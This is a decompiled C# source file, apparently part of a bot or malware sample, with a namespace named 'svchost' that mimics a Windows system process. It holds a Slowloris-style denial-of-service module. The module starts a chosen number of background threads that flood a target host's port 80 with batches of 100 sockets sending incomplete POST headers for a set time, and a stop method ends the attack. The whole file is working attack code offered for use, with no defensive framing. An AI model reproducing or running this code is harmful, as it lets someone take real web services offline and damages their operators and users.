using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

[StandardModule]
public sealed class Slowloris
{
	private static object ThreadsEnded = 0;

	private static string PostDATA;

	private static string HostToAttack;

	private static int TimetoAttack;

	private static int ThreadstoUse;

	private static Thread[] Threads;

	private static bool AttackRunning = false;

	private static int attacks = 0;

	public static void StartSlowloris(string Host, int Threadsto, int Time, string data)
	{
		if (AttackRunning)
		{
			return;
		}
		AttackRunning = true;
		HostToAttack = Host;
		PostDATA = data;
		ThreadstoUse = Threadsto;
		TimetoAttack = Time;
		if (HostToAttack.Contains("http://"))
		{
			HostToAttack = HostToAttack.Replace("http://", string.Empty);
		}
		if (HostToAttack.Contains("www."))
		{
			HostToAttack = HostToAttack.Replace("www.", string.Empty);
		}
		if (HostToAttack.Contains("/"))
		{
			HostToAttack = HostToAttack.Replace("/", string.Empty);
		}
		checked
		{
			Threads = new Thread[Threadsto - 1 + 1];
			int num = Threadsto - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					Threads[num2] = new Thread(DoWork);
					Threads[num2].IsBackground = true;
					Threads[num2].Start();
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private static void lol()
	{
		ThreadsEnded = Operators.AddObject(ThreadsEnded, (object)1);
		if (Operators.ConditionalCompareObjectEqual(ThreadsEnded, (object)ThreadstoUse, false))
		{
			ThreadsEnded = 0;
			ThreadstoUse = 0;
			AttackRunning = false;
			attacks = 0;
		}
	}

	public static void StopSlowloris()
	{
		if (!AttackRunning)
		{
			return;
		}
		checked
		{
			int num = ThreadstoUse - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				try
				{
					Threads[num2].Abort();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				num2++;
			}
			AttackRunning = false;
			attacks = 0;
		}
	}

	private static void DoWork()
	{
		checked
		{
			try
			{
				Socket[] array = new Socket[100];
				TimeSpan timeSpan = TimeSpan.FromSeconds(TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < timeSpan)
				{
					try
					{
						new WebClient();
						int num = 0;
						do
						{
							array[num] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							array[num].Connect(Dns.GetHostAddresses(HostToAttack), 80);
							array[num].Send(Encoding.Default.GetBytes("POST / HTTP/1.1\r\nHost: " + HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"), SocketFlags.None);
							attacks++;
							num++;
						}
						while (num <= 99);
						int num2 = 0;
						do
						{
							array[num2].Close();
							num2++;
						}
						while (num2 <= 99);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			lol();
		}
	}
}
